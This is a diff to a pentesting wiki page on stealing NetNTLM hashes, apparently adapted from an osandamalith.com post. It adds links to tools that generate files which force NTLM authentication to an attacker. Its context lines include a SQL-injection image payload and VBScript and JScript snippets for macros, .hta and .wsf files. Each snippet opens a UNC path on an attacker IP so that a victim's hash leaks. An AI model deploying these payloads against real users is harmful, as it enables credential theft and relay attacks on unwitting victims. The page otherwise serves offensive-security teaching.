@@ -1,10 +1,22 @@
 # Places to steal NTLM creds
 
-**All this POST was copied from:** [**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/**](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)\*\*\*\*
+## Automatic Payloads Creation & Other lists
 
-## \*\*\*\*[Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+### [htlm\_theft](https://github.com/Greenwolf/ntlm_theft)
 
-One day me and @m3g9tr0n were discussing different places where we can use responder in stealing NetNTLM hashes. After experimenting I thought of writing this post along with some cool findings in the world of Windows. SMBRelay attacks are also possible in these scenarios.
+This tool will **create several documents/files** that if accessed by the user somehow they will s**tart a NTLM authentication with the attacker**.
+
+### [All\_NTLM-Leak](https://github.com/Gl3bGl4z/All_NTLM_leak)
+
+This is a list of techniques to force NTLM authentications to steal credentials from the victim.
+
+### Force NTLM Privileged Authentication
+
+You may be able to **force a windows machine to authenticate to an arbitrary machine** using a privileged account. Read the following page to learn more:
+
+{% page-ref page="../active-directory-methodology/printers-spooler-service-abuse.md" %}
+
+
 
 ## LFI
 
@@ -31,9 +43,6 @@ In here I’m using “php://filter/convert.base64-encode/resource=” that will
   <password></password>
 </root>
 ```
-
-  
-
 
 ![](https://osandamalith.files.wordpress.com/2017/03/xxe.png?w=640)
 
@@ -95,8 +104,7 @@ find, findstr, [x]copy, move, replace, del, rename and many more!
 
 ## Auto-Complete
 
-You just need to type ‘\\host\’ the auto-complete will do the trick under the explorer and the run dialog box.  
-
+You just need to type ‘\\host\’ the auto-complete will do the trick under the explorer and the run dialog box.
 
 ![](https://osandamalith.files.wordpress.com/2017/03/explorer.png?w=640)
 
@@ -230,14 +238,14 @@ http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00
 
 You can save this as .vbs or can be used inside a macro that is applied to Word or Excel files.
 
-```text
+```bash
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
 ```
 
 You can apply in web pages but this works only with IE.
 
-```text
+```markup
 <html>
 <script type="text/Vbscript">
 <!--
@@ -271,14 +279,14 @@ You can apply this in html files too. But only works with IE. You can save this 
 
 You can save this as something.js under windows.
 
-```text
+```javascript
 var fso = new ActiveXObject("Scripting.FileSystemObject")
 fso.FileExists("//192.168.0.103/aa")
 ```
 
 You can apply the same in html files but only works with IE. Also you can save this as something.hta.
 
-```text
+```markup
 <html>
 <script type="text/Jscript">
 <!--
@@ -297,7 +305,7 @@ Here’s the encoded version. You can save this as something.jse.
 
 The html version of this.
 
-```text
+```markup
 <html>
 <script type="text/Jscript.Encode">
 <!--
@@ -311,7 +319,7 @@ The html version of this.
 
 Save this as something.wsf.
 
-```text
+```markup
 <package>
   <job id="boom">
     <script language="VBScript">
@@ -591,7 +599,8 @@ thread = DX.CreateThread (0,0,scLocation,0,0)
 
 There might be many other ways in Windows. You never know! 🙂
 
-### References
+## References
 
-[https://attack.mitre.org/techniques/T1187/](https://attack.mitre.org/techniques/T1187/)
+* [**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/**](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)\*\*\*\*
+* [https://attack.mitre.org/techniques/T1187/](https://attack.mitre.org/techniques/T1187/)
 
